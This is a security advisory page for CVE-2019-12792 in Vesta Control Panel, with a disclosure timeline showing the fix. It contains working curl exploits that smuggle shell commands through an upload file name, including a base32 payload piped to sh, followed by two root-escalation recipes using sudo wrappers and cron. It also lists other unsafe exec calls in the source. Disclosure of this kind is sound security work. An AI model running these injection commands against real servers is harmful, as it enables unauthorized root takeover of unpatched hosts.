@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+
+        <title>[CVE-2019-12792] Vesta Control Panel 0.9.8-24 — Privilege escalation in the upload handler</title>
+
+        
+        <meta name="description" content="Privilege escalation to root can be achieved by a regular user via the file upload handler exploiting an insufficient shell escaping mechanism.">
+        
+
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:site" content="@cyrus_and">
+        <meta property="og:url" content="https://cardaci.xyz/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler/">
+        <meta property="og:title" content="[CVE-2019-12792] Vesta Control Panel 0.9.8-24 — Privilege escalation in the upload handler">
+        <meta property="og:image" content="https://cardaci.xyz/assets/img/icon.png">
+        
+        <meta property="og:description" content="Privilege escalation to root can be achieved by a regular user via the file upload handler exploiting an insufficient shell escaping mechanism.">
+        
+
+        <link type="application/atom+xml" rel="alternate" href="https://cardaci.xyz/feed.xml" title="Andrea Cardaci" />
+
+        <link rel="icon" href="/assets/img/icon.png">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+        <meta name="theme-color" content="#000000">
+
+        
+
+        <link rel="stylesheet" href="/assets/css/post.css" type="text/css" media="screen"/>
+        <link rel="stylesheet" href="/assets/css/print.css" type="text/css" media="print"/>
+    </head>
+    <body>
+        <div id="header">
+    <a href="/">Home</a>
+    #
+    
+
+
+<a href="/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler/">Permalink</a>
+<a title="Share on Twitter" href="https://twitter.com/intent/tweet?text=%5BCVE-2019-12792%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+upload+handler%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F">Twitter</a>
+<a title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F">Facebook</a>
+<a title="Share on LinkedIn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F&title=%5BCVE-2019-12792%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+upload+handler">LinkedIn</a>
+
+</div>
+
+<div id="container">
+    <h1>[CVE-2019-12792] Vesta Control Panel 0.9.8-24 — Privilege escalation in the upload handler</h1>
+    <p id="post-info">Andrea Cardaci — 12 August 2019</p>
+    
+    
+    <table id="advisory-header">
+  <thead>
+    <tr>
+      <th style="text-align: right"> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right"><strong>Discovered</strong></td>
+      <td>2019-03-15</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Author</strong></td>
+      <td><a href="mailto:cyrus.and@gmail.com">Andrea Cardaci</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Product</strong></td>
+      <td><a href="https://vestacp.com/">Vesta Control Panel</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>Tested versions</strong></td>
+      <td>0.9.8-24</td>
+    </tr>
+    <tr>
+      <td style="text-align: right"><strong>CVE</strong></td>
+      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12792">CVE-2019-12792</a></td>
+    </tr>
+  </tbody>
+</table>
+
+    
+    <h2 id="abstract">Abstract</h2>
+
+<p>The insufficient shell escaping mechanism used during the invocation of the <code class="language-plaintext highlighter-rouge">exec</code> PHP function allows a registered user to run arbitrary system commands as the <code class="language-plaintext highlighter-rouge">admin</code> user, to whom VestaCP grants full access. A malicious registered user can thus escalate its privileges up to <code class="language-plaintext highlighter-rouge">root</code> by submitting a POST request to the web application.</p>
+
+<p><a href="https://www.hestiacp.com/">HestiaCP</a> (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.</p>
+
+<h2 id="details">Details</h2>
+
+<p>The PHP script reachable at <code class="language-plaintext highlighter-rouge">/upload/UploadHandler.php</code> naively uses <code class="language-plaintext highlighter-rouge">'...'</code> to shell-escape the user input (instead of using <code class="language-plaintext highlighter-rouge">escapeshellarg</code>):</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span> <span class="mf">.</span> <span class="s2">"v-copy-fs-file "</span><span class="mf">.</span> <span class="no">USERNAME</span> <span class="mf">.</span><span class="s2">" </span><span class="si">{</span><span class="nv">$uploaded_file</span><span class="si">}</span><span class="s2"> '</span><span class="si">{</span><span class="nv">$file_path</span><span class="si">}</span><span class="s2">'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">$file_path</code> variable is controlled by the user as it corresponds to the name of the file being uploaded. By crafting a proper file name it is possible to escape the single quotes and <em>blindly</em> run additional commands as the <code class="language-plaintext highlighter-rouge">admin</code> user (the one that runs the web server in VestaCP).</p>
+
+<p>For example, the following <code class="language-plaintext highlighter-rouge">curl</code> invocation uses the <code class="language-plaintext highlighter-rouge">sleep</code> command to prove the RCE success:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>... <span class="c"># grab it from an authenticated regular user session</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">time </span>curl <span class="nt">-sk</span> <span class="nt">-o</span> /dev/null https://target.com:8083/upload/ <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s2">"PHPSESSID=</span><span class="nv">$PHPSESSID</span><span class="s2">"</span> <span class="se">\</span>
+    <span class="nt">-F</span> <span class="s2">"files=@/dev/null;filename=</span><span class="se">\"</span><span class="s2">';sleep 5;#</span><span class="se">\"</span><span class="s2">"</span>
+<span class="go">
+real    0m5.097s
+user    0m0.032s
+sys     0m0.004s
+</span></code></pre></div></div>
+
+<p>Since the file name is filtered through the <code class="language-plaintext highlighter-rouge">basename</code> PHP function, the payload cannot contain <code class="language-plaintext highlighter-rouge">/</code>. Follows a more general solution that allows to execute arbitrary commands by using the Base32 encoding:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'[ -w ~admin/.bashrc ] &amp;&amp; sleep 5'</span>
+<span class="gp">$</span><span class="w"> </span><span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> | <span class="nb">base32</span> <span class="nt">-w0</span><span class="si">)</span><span class="s2">"</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">time </span>curl <span class="nt">-sk</span> <span class="nt">-o</span> /dev/null https://target.com:8083/upload/ <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s2">"PHPSESSID=</span><span class="nv">$PHPSESSID</span><span class="s2">"</span> <span class="se">\</span>
+    <span class="nt">-F</span> <span class="s2">"files=@/dev/null;filename=</span><span class="se">\"</span><span class="s2">';echo </span><span class="nv">$PAYLOAD</span><span class="s2"> | base32 -d | sh;#</span><span class="se">\"</span><span class="s2">"</span>
+<span class="go">
+real    0m5.087s
+user    0m0.028s
+sys     0m0.000s
+</span></code></pre></div></div>
+
+<p>The above also proves that is possible to write files in the <code class="language-plaintext highlighter-rouge">admin</code> home directory.</p>
+
+<h3 id="from-admin-to-root-access">From admin to root access</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">admin</code> user ultimately has full access to the target machine, yet VestaCP seems to make it hard for it to run superuser commands. For completeness, follows two possible ways to accomplish that.</p>
+
+<h4 id="misusing-the-v-start-service-command">Misusing the <code class="language-plaintext highlighter-rouge">v-start-service</code> command</h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">service</code> system command provides a way to execute arbitrary executables and not only init scripts<sup id="fnref:service" role="doc-noteref"><a href="#fn:service" class="footnote" rel="footnote">1</a></sup>. Since <code class="language-plaintext highlighter-rouge">v-start-service</code> is a merely wrapper around <code class="language-plaintext highlighter-rouge">service</code>, it is possible to exploit it to run arbitrary executables as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Set the <code class="language-plaintext highlighter-rouge">COMMAND</code> variable as follows:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'
+</span><span class="gp">    echo "id &gt;</span><span class="s1">/usr/local/vesta/web/proof" &gt;/tmp/x
+</span><span class="go">    chmod +x /tmp/x
+    sudo /usr/local/vesta/bin/v-start-service ../../tmp/x'
+</span></code></pre></div></div>
+
+<p>Run the remaining commands as above, then check that the proof file is created in the web server root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-k</span> https://target.com:8083/proof
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+
+<h4 id="using-cron">Using cron</h4>
+
+<p>One simple way for the <code class="language-plaintext highlighter-rouge">admin</code> user to legitimately execute <code class="language-plaintext highlighter-rouge">root</code> commands is to replace the <code class="language-plaintext highlighter-rouge">/etc/crontab</code> file and restart the cron daemon using the <code class="language-plaintext highlighter-rouge">v-change-sys-service-config</code> VestaCP utility. Set the <code class="language-plaintext highlighter-rouge">COMMAND</code> variable as follows:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'
+</span><span class="gp">    echo "* * * * * root id &gt;</span><span class="s1">/usr/local/vesta/web/proof" &gt;/tmp/x
+</span><span class="go">    sudo /usr/local/vesta/bin/v-change-sys-service-config /tmp/x cron yes'
+</span></code></pre></div></div>
+
+<p>Run the remaining commands as above, then after one minute check that the proof file is created in the web server root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-k</span> https://target.com:8083/proof
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+
+<h2 id="other-instances-of-similar-vulnerabilities">Other instances of similar vulnerabilities</h2>
+
+<p>Several other instances of the same or similar problems have been found in the VestaCP source code. The following list<sup id="fnref:git-tree" role="doc-noteref"><a href="#fn:git-tree" class="footnote" rel="footnote">2</a></sup> is a best-effort attempt to enumerate such instances, they are not tested and often are not exploitable in practice or not interesting since only the <code class="language-plaintext highlighter-rouge">admin</code> user can reach the code, but should nevertheless be fixed<sup id="fnref:fixed" role="doc-noteref"><a href="#fn:fixed" class="footnote" rel="footnote">3</a></sup>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// /usr/local/vesta/web/edit/mail/index.php:75</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-list-mail-account-autoreply "</span><span class="mf">.</span><span class="nv">$user</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span><span class="nv">$v_account</span><span class="mf">.</span><span class="s2">"' json"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/mail/index.php:231</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-mail-account-alias "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_account</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$alias</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/mail/index.php:257</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-mail-account-forward "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_account</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$forward</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/server/index.php:342</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-add-backup-host '"</span><span class="mf">.</span> <span class="nv">$v_backup_type</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_host</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_username</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_password</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_bpath</span> <span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/server/index.php:359</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-backup-host '"</span><span class="mf">.</span> <span class="nv">$v_backup_type</span> <span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/server/index.php:367</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-add-backup-host '"</span><span class="mf">.</span> <span class="nv">$v_backup_type</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_host</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_username</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_password</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_bpath</span> <span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/server/index.php:389</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-add-backup-host '"</span><span class="mf">.</span> <span class="nv">$v_backup_type</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_host</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_username</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_password</span> <span class="mf">.</span><span class="s2">"' '"</span><span class="mf">.</span> <span class="nv">$v_backup_bpath</span> <span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/server/index.php:406</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-backup-host '"</span><span class="mf">.</span> <span class="nv">$v_backup_type</span> <span class="mf">.</span><span class="s2">"'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:39</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-list-web-domain-ssl "</span><span class="mf">.</span><span class="nv">$user</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">"' json"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:142</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-list-dns-domain "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$v_alias</span><span class="mf">.</span><span class="s2">"' json"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:145</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-change-dns-domain-ip "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$v_alias</span><span class="mf">.</span><span class="s2">"' "</span><span class="mf">.</span><span class="nv">$v_ip</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:176</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-web-domain-alias "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$alias</span><span class="mf">.</span><span class="s2">"' 'no'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:184</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-delete-dns-on-web-alias "</span><span class="mf">.</span><span class="nv">$v_username</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$alias</span><span class="mf">.</span><span class="s2">"' 'no'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:317</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-list-web-domain-ssl "</span><span class="mf">.</span><span class="nv">$user</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">"' json"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/edit/web/index.php:370</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-add-letsencrypt-domain "</span><span class="mf">.</span><span class="nv">$user</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" '"</span><span class="mf">.</span><span class="nv">$l_aliases</span><span class="mf">.</span><span class="s2">"' 'no'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/reset/mail/index.php:135</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-get-mail-account-value '"</span><span class="mf">.</span><span class="nv">$v_user</span><span class="mf">.</span><span class="s2">"' "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_account</span><span class="mf">.</span><span class="s2">" 'md5'"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+
+<span class="c1">// /usr/local/vesta/web/reset/mail/index.php:154</span>
+<span class="nb">exec</span> <span class="p">(</span><span class="no">VESTA_CMD</span><span class="mf">.</span><span class="s2">"v-change-mail-account-password '"</span><span class="mf">.</span><span class="nv">$v_user</span><span class="mf">.</span><span class="s2">"' "</span><span class="mf">.</span><span class="nv">$v_domain</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_account</span><span class="mf">.</span><span class="s2">" "</span><span class="mf">.</span><span class="nv">$v_new_password</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="timeline">Timeline</h2>
+
+<dl>
+  <dt>2019-05-28</dt>
+  <dd>Disclosed to the VestaCP team.</dd>
+  <dt>2019-06-10</dt>
+  <dd>MITRE assigns <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12792">CVE-2019-12792</a> to this vulnerability.</dd>
+  <dt>2019-07-29</dt>
+  <dd>Final warning via <a href="https://github.com/serghey-rodin/vesta/issues/1921">GitHub issue</a> since emails have been ignored.</dd>
+  <dt>2019-07-30</dt>
+  <dd>The VestaCP author asks one more week to fix the issue and publish a new release.</dd>
+  <dt>2019-08-07</dt>
+  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/b17b4b205df0c01dada54d9684cfaa94b924064a">fixes</a> the vulnerability.</dd>
+  <dt>2019-08-15</dt>
+  <dd>The VestaCP team <a href="https://github.com/serghey-rodin/vesta/commit/868dd8b146e76ea3c83c26855ae2f60b22d989d2">releases</a> version 0.9.8-25.</dd>
+</dl>
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:service" role="doc-endnote">
+      <p>See the <a href="https://gtfobins.github.io/gtfobins/service/">GTFOBins entry</a>. <a href="#fnref:service" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:git-tree" role="doc-endnote">
+      <p>Locations refer to the Git commit <a href="https://github.com/serghey-rodin/vesta/tree/e1fb811caf73e5d8de49e3d2a0098a1afb0f647f">e1fb811caf73e5d8de49e3d2a0098a1afb0f647f</a>. <a href="#fnref:git-tree" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fixed" role="doc-endnote">
+      <p>Some of them (and others) are fixed in a subsequent <a href="https://github.com/serghey-rodin/vesta/pull/1865/commits/0831a198b86a4760e83c0eaec78d84bab7098e6c">pull request</a>. <a href="#fnref:fixed" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+</div>
+
+<script>
+ // add permalink on headings
+ document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
+     const link = document.createElement('a');
+     link.className = 'permalink';
+     link.href = `#${heading.id}`;
+     heading.appendChild(link);
+ });
+
+ // add download links (add the following after the block {: download="filename.ext"})
+ document.querySelectorAll('div[download]').forEach((node) => {
+     const name = node.getAttribute('download');
+     const blob = new Blob([node.innerText]);
+     const span = document.createElement('span');
+     span.className = 'download-label';
+     span.appendChild(document.createTextNode(name));
+     node.prepend(span);
+     const a = document.createElement('a');
+     a.setAttribute('href', URL.createObjectURL(blob));
+     a.setAttribute('download', name);
+     a.appendChild(document.createTextNode(name));
+     node.prepend(a);
+ });
+</script>
+
+        <div id="footer">
+            Andrea Cardaci &copy; 2021. All rights reserved (unless explicitly stated otherwise).
+
+        </div>
+    </body>
+</html>
